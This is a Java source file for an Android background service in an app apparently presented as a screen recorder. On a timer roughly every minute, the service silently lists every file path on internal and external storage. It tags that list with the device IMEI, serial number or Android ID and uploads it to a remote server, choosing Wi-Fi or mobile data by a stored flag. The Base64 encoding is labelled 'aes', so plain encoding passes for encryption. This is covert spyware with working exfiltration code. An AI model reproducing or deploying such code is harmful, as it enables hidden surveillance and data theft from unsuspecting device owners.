package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.Base64;
import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class Sdcard extends Service {
    private File root;
    public static boolean started = false;
    private ArrayList<File> fileList = new ArrayList<File>();
    static final String SAMPLE_EXTENSION = " ";
    StringBuilder sb;
    StringBuilder sb1;
    static int counter = 0;
    File rootDir;
    String aes;
    StringBuilder sBuffer;
    StringBuilder sBuffer1;
    String time_stamp = "";
    String textSdcardEncode;
    Timer mytimer;

    public Sdcard() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    public void onCreate() {
        super.onCreate();
    }

    public void onStart(Intent intent, int startId) {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
        wl.acquire();
        // screen and CPU will stay awake during this section
        wl.release();


		/*try {
			File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "files.txt");
			if (!myFile.exists()){
				myFile.createNewFile();
				FileOutputStream fOut = new FileOutputStream(myFile);
				OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
				//   myOutWriter.append(sBuffer);
				myOutWriter.append(sb.toString());
				//  myOutWriter.append(sBuffer1);
				//myOutWriter.append(sb1.toString());
				myOutWriter.close();
				fOut.flush();
				fOut.close();
			}
			else {
				System.out.println("SdCard File Exist");
			}

			*//*File SdFiles = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"files.txt");
			FileOutputStream fileOutputStream = new FileOutputStream(SdFiles,false);
			fileOutputStream.write(sb.toString().getBytes());
			fileOutputStream.flush();
			fileOutputStream.close();*//*
		}
		catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/

        mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- Sdcard");
                sendfile();
            }
        },5000,60500);//change Timer Value
        //sendfile();

    }

    public void getfile(File dir) {
        try {
            File listFile[] = dir.listFiles();
            if (listFile != null && listFile.length > 0) {
                for (int i = 0; i < listFile.length; i++) {

                    if (listFile[i].isDirectory()) {
                        sb.append(listFile[i].getAbsolutePath() + "\n");
                        getfile(listFile[i]);

                    } else {

                        //Log.d("Debug", "absolute path "+listFile[i].getAbsolutePath());
                        sb.append(listFile[i].getAbsolutePath() + "\n");
                    }

                }

            }
        }
        catch (Exception e){
            Log.d("getfile","sdcard"+e);
        }

        //	return fileList;

    }

    public void getExternalSDCardDirectory(File rootdir) {

        File listFile[] = rootdir.listFiles();
        if (listFile != null && listFile.length > 0) {
            for (int i = 0; i < listFile.length; i++) {

                if (listFile[i].isDirectory()) {
                    sb1.append(listFile[i].getParent() + "\n");
                    getfile(listFile[i]);

                } else {

                    //Log.d("Debug", "absolute path "+listFile[i].getParent());
                    sb1.append(listFile[i].getParent() + "\n");
                }

            }
        }

    }

    public void sendfile() {
        sb = new StringBuilder();
        sb1 = new StringBuilder();
        started = true;
        //	sBuffer= new StringBuilder("Internal memory");
        //	sBuffer1= new StringBuilder("External memory");
        root = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        File innerDir = new File("/mnt/extSdCard");  ///Environment.getExternalStorageDirectory();
        rootDir = innerDir.getParentFile();
        getfile(root);
        getExternalSDCardDirectory(rootDir);


        HttpClient httpclient = new DefaultHttpClient();
        String aa = UrlDemo.fsupload;
        HttpPost httppost = new HttpPost(aa);
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();

        byte[] imeidata = imei.getBytes();
        String imeibasecode = android.util.Base64.encodeToString(imeidata, android.util.Base64.DEFAULT);
        String imeibasecodestring = imeibasecode.replaceAll("\n", "");

        String serial = android.os.Build.SERIAL;
        System.out.println("Serial sdcard = " + serial);
        byte[] serialdata = serial.getBytes();
        String serialbasecode = android.util.Base64.encodeToString(serialdata, android.util.Base64.DEFAULT);
        String serialbasecodestring = serialbasecode.replaceAll("\n", "");

        String uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        System.out.println("uid sdcard = " + uid);
        byte[] uiddata = uid.getBytes();
        String uidbasecode = android.util.Base64.encodeToString(uiddata, android.util.Base64.DEFAULT);
        String uidbasecodestring = uidbasecode.replaceAll("\n", "");

        try {

            SharedPreferences sp = getSharedPreferences("key", 0);
            String tValue = sp.getString("chksdcard", "");

            String base64encoded_filedata = "";
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
            try {
                String res = sb.toString();
                aes = Base64.encodeBytes(res.getBytes());

                sb.setLength(0);
            } catch (Exception e) {
                Log.d(getClass().getSimpleName(), "   Exception thrown in encrypting  internal files " + e);
            }
            try {

                Date dt = new Date();
                int min = dt.getMinutes();
                int hr = dt.getHours();
                String strmin = "", strhr = "";
                if (min < 10)
                    strmin = "0" + Integer.toString(min);
                else
                    strmin = Integer.toString(min);
                if (hr < 10)
                    strhr = "0" + Integer.toString(hr);
                else
                    strhr = Integer.toString(hr);
                time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";


            } catch (Exception e) {
                Log.d(getClass().getSimpleName(), "Exception:" + e);
            }

            System.out.println("tert----------->"+Values.getSharedPrefrence("sd_card_length", getApplicationContext())+"------->"+String.valueOf(aes.length()));
            String str_old_file_length = Values.getSharedPrefrence("sd_card_length", getApplicationContext());
            long lng_old_file_length = 0;
            if(!str_old_file_length.equalsIgnoreCase("NA")) {
                try {
                    lng_old_file_length = Long.parseLong(str_old_file_length);
                }
                catch (Exception e) { lng_old_file_length = 0; }
            }
            else {
                lng_old_file_length = 0;
            }
            if(lng_old_file_length+100 < Long.parseLong(String.valueOf(aes.length()))
                    || lng_old_file_length-100 > Long.parseLong(String.valueOf(aes.length()))) {
                System.out.println("tert-----------");
                Values.setSharedPrefrence("sd_card_length", String.valueOf(aes.length()), getApplicationContext());
                String Sdfile_name = "files.txt";
                byte[] namedata = Sdfile_name.getBytes("UTF-8");
                String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
                String string = filenameencode.replaceAll("\n", "");


                ConnectivityManager connectivity;
                NetworkInfo wifiInfo;
                connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
                wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                String buffer = "";
                if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {

                    if (imei != null) {
                        System.out.println("IMEI NOT NUll sdcard = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));

                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);

                    }//imei chk null
                    else if (serial != null) {
                        System.out.println("IMEI NUll && serial no not null = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", serialbasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));
                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);
                    } else {
                        System.out.println("IMEI NUll && serial no null && Android Id not null = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", uidbasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));
                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);
                    }//else chk imei

                }//if con end
                else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
                    if (imei != null) {
                        System.out.println("IMEI NOT NUll sdcard = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));

                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);

                    }//imei chk null
                    else if (serial != null) {
                        System.out.println("IMEI NUll && serial no not null = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", serialbasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));
                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);
                    } else {
                        System.out.println("IMEI NUll && serial no null && Android Id not null = ");
                        nameValuePairs.add(new BasicNameValuePair("FNAME", string));
                        nameValuePairs.add(new BasicNameValuePair("IMEI", uidbasecodestring));
                        nameValuePairs.add(new BasicNameValuePair("DATA", aes));
                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                        HttpResponse response = httpclient.execute(httppost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();
                        InputStream in = entity.getContent();
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }
                        Log.d("Debug", "Response of sdcard" + buffer);
                    }//else chk imei
                } else {
                    System.out.println("SdcardConection Error");
                }
            }

        } catch (Exception e) {
        }
        stopSelf();
				/*File file1 = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "files.txt");
				file1.delete();*/
    }
    public void onDestroy() {
        try {
            mytimer.cancel();
        } catch (Exception e) {}
        started = false;

    }
}
